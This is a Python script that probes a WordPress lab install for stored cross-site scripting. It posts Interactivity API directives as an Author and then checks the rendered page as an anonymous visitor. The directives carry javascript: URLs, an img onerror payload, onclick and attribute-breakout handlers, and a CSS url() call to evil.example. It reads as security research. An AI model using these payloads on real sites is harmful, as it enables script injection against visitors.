#!/usr/bin/env python3
"""Focused look at what the front end emits for the Author-planted directives."""
import re
import sys
import requests
from wplab import sess, BASE

author = sess("author")
anon = requests.Session()

CASES = [
    ("href-js",
     """<p data-wp-interactive='{"namespace":"pwn"}' data-wp-context='{"u":"javascript:alert(document.domain)"}'>"""
     """<a data-wp-bind--href="context.u">MARKER_HREF</a></p>"""),
    ("style-css",
     """<p data-wp-interactive='{"namespace":"pwn"}' data-wp-context='{"c":"red;background:url(//evil.example/x)"}' """
     """data-wp-style--color="context.c">MARKER_STYLE</p>"""),
    ("text-html",
     """<p data-wp-interactive='{"namespace":"pwn"}' data-wp-context='{"t":"<img src=x onerror=alert(1)>"}' """
     """data-wp-text="context.t">MARKER_TEXT</p>"""),
    ("bind-onclick",
     """<p data-wp-interactive='{"namespace":"pwn"}' data-wp-context='{"u":"alert(document.domain)"}'>"""
     """<b data-wp-bind--onclick="context.u">MARKER_ONCLICK</b></p>"""),
    ("bind-title-breakout",
     """<p data-wp-interactive='{"namespace":"pwn"}' data-wp-context='{"u":"a\\" onmouseover=\\"alert(1)"}'>"""
     """<b data-wp-bind--title="context.u">MARKER_BREAKOUT</b></p>"""),
]

WRAPPERS = {
    "core/query": ('<!-- wp:query {"queryId":1,"query":{"perPage":1,"postType":"post"}} -->\n'
                   '<div class="wp-block-query">%s</div>\n<!-- /wp:query -->'),
    "none": "%s",
}

for wname, wrap in WRAPPERS.items():
    print("#" * 78)
    print("# wrapper:", wname)
    print("#" * 78)
    for name, payload in CASES:
        inner = "<!-- wp:html -->\n%s\n<!-- /wp:html -->" % payload
        j = author.rest("POST", "/wp/v2/posts", json={
            "title": f"iapi2 {wname} {name}", "content": wrap % inner,
            "status": "publish"}).json()
        pid = j["id"]
        raw = j["content"]["raw"]
        html = anon.get(BASE + f"/?p={pid}").text
        marker = "MARKER_" + name.split("-")[0].upper() if False else None
        m = re.search(r"MARKER_[A-Z]+", raw)
        marker = m.group(0) if m else "MARKER"
        print(f"\n--- {name}  (post {pid}) ---")
        print("  STORED  :", re.sub(r"\s+", " ", raw.strip())[:400])
        idx = html.find(marker)
        if idx < 0:
            print("  FRONTEND: marker NOT present in rendered page")
        else:
            print("  FRONTEND:", re.sub(r"\s+", " ", html[max(0, idx - 320):idx + 60]))
